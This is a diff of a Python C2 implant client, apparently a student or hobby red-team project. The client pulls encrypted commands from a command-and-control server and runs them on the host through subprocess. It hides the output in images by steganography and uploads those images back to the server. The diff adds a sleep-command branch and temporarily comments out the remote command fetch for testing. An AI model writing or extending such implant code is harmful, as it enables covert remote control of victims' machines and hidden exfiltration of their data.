@@ -37,10 +37,14 @@ def mod_img(msg):
 #Execute command 
 def exec(cmd): 
     print("[+] Executing command: %s" % cmd)
-    cmd_lst = cmd.split()
-    output = subprocess.run(cmd_lst, capture_output=True, text=True) #running command on host machine 
-    result = output.stdout 
-    print("[+] Result: %s" % result)
+    result = ""
+    if cmd == "sleep 10":
+        time.sleep(10)
+    else: 
+        cmd_lst = cmd.split()
+        output = subprocess.run(cmd_lst, capture_output=True, text=True) #running command on host machine 
+        result = output.stdout 
+        print("[+] Result: %s" % result)
     return result 
 
 #Sending output back to C2Server 
@@ -85,13 +89,14 @@ if __name__ == '__main__':
     while True: 
         try: 
             #Note: comment out the first three lines (until cmd = "ls -la") to test steganography functions
-            response = requests.get(routes[0]) 
-            encrypted_cmd = parse_json(response) 
-            cmd = decrypt(encrypted_cmd) 
-            cmd = "ls -la"
+            #response = requests.get(routes[0]) 
+            #encrypted_cmd = parse_json(response) 
+            #cmd = decrypt(encrypted_cmd) 
+            cmd = "ls -la" #need to figure out this logic if give a sleep command
             output = exec(cmd) 
-            obf_img = mod_img(output)
-            requests.post(routes[1], files={"file": open(obf_img,'rb')})
+            if output != "": 
+                obf_img = mod_img(output)
+                requests.post(routes[1], files={"file": open(obf_img,'rb')})
         except Exception as e: 
             """
             Options for handling query failure: 
